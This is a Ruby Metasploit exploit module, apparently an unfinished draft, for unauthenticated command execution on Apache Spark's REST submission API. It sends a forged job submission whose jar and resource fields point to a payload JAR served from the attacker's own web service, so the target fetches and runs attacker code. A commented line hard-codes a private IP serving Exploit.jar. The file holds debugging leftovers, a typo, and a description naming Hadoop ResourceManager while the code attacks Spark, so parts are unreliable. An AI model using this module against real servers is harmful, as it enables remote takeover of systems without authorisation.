##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
require 'pry-byebug'
class MetasploitModule < Msf::Exploit::Remote

  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::CmdStager

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Spark Unauthenticated Command Execution',
      'Description'    => %q{
          This module exploits an unauthenticated command execution vulnerability in Apache Hadoop through ResourceManager REST API.
      },
      'License'        => MSF_LICENSE,
      'Author'         =>
        [
          'cbmixx',                            # Proof of concept
          'Green-m <greenm.xxoo[at]gmail.com>' # Metasploit module
        ],
      'References'     =>
        [
          ['URL', 'http://archive.hack.lu/2016/Wavestone%20-%20Hack.lu%202016%20-%20Hadoop%20safari%20-%20Hunting%20for%20vulnerabilities%20-%20v1.0.pdf'],
          ['URL', 'https://github.com/vulhub/vulhub/tree/master/hadoop/unauthorized-yarn']
        ],
      'Platform'       => 'linux',
      'Arch'           => [ARCH_X86, ARCH_X64],
      'Targets'        =>
        [
          ['Automatic', {}]
        ],
      'Privileged'     => false,
      'DisclosureDate' => 'Oct 19 2016',
      'DefaultTarget'  => 0
    ))

    register_options([
      Opt::RPORT(6066)
    ])

    register_advanced_options([
      OptString.new('DownUri', [false, 'The URI to use for this exploit to download and execute. (default is random)'])
    ])

    deregister_options('URIPATH')
  end

  def check

  end

  def exploit
    #binding.pry
    fail_with(Failure::Unknown, "Something went horribly wrong and we couldn't continue to exploit.") unless get_version

    vprint_status("Generating payload ...")
    @pl = generate_payload.encoded_jar(:andom => true)
    print_error("Failed to generate the payload.") unless @pl

    path = datastore['DownUri'] || rand_text_alpha(8..16)

    if datastore['SRVHOST'].empty? || datastore['SRVHOST'] == '0.0.0.0'
      binding_ip = Rex::Socket.source_address('1.2.3.4')
    else
      binding_ip = datastore['SRVHOST']
    end

    proto = datastore['SSL'] ? 'https' : 'http'
    @payload_uri = "#{proto}://#{binding_ip}:#{datastore['SRVPORT']}/#{path}"

    print_status("Starting up our web service ...")
    start_service({'Uri' => {
     'Proc' => Proc.new { |cli, req|
       on_request_uri(cli, req)
     },
     'Path' => '/' + path
    }})

    send_payload


  end

  def get_version
    @version = nil

    res = send_request_cgi(
      'uri'           => normalize_uri(target_uri.path),
      'method'        => 'GET'
    )

    unless res
      vprint_bad("#{peer} - No response. ")
      return false
    end

    if res && res.code == 401
      print_bad("#{peer} - Authentication required.")
      return false
    end

    if res && res.code == 400
      res_json = res.get_json_document

      if res_json.empty?
        vprint_bad("#{peer} - Cannot parse the response, seems like it's not Spark REST API.")
        return false
      end

      @version = res_json['serverSparkVersion'] if res_json['serverSparkVersion']
      return true
    end

    return false
  end

  def send_payload 
    #binding.pry
    rand_classname = Rex::Text.rand_text_alpha_lower(8..16)
    rand_appname   = Rex::Text.rand_text_alpha_lower(8..16)

    data = 
    {  
      "action"                    => "CreateSubmissionRequest",
      "clientSparkVersion"        => @version.to_s,
      "appArgs"                   => [],
      "appResource"              => @payload_uri.to_s,
      #"appResource"               => 'http://192.168.77.136:10000/Exploit.jar',
      "environmentVariables"      => {"SPARK_ENV_LOADED" => "1"},
      "mainClass"                 => rand_classname.to_s,
      "sparkProperties"           => 
      {
        "spark.jars"             => @payload_uri.to_s,
        #"spark.jars"              => 'http://192.168.77.136:10000/Exploit.jar',
        "spark.driver.supervise"  => "false",
        "spark.app.name"          => rand_appname.to_s,
        "spark.eventLog.enabled"  => "true",
        "spark.submit.deployMode" => "cluster",
        "spark.master"            => "spark://#{rhost}:#{rport}"
      }
    }

    res = send_request_cgi(
      'uri'           => normalize_uri(target_uri.path, "/v1/submissions/create"),
      'method'        => 'POST',
      'ctype'         => 'application/json;charset=UTF-8',
      'data'          => data.to_json
    )
    puts res.code
    puts res.body
    puts @pl
  end

  # Handle incoming requests
  def on_request_uri(cli, request)
    if (not @pl)
      print_error("#{rhost}:#{rport} - A request came in, but the payload wasn't ready yet!")
      return
    end
    print_status("#{rhost}:#{rport} - Sending the payload to the server...")
    send_response(cli, @pl)
  end

end
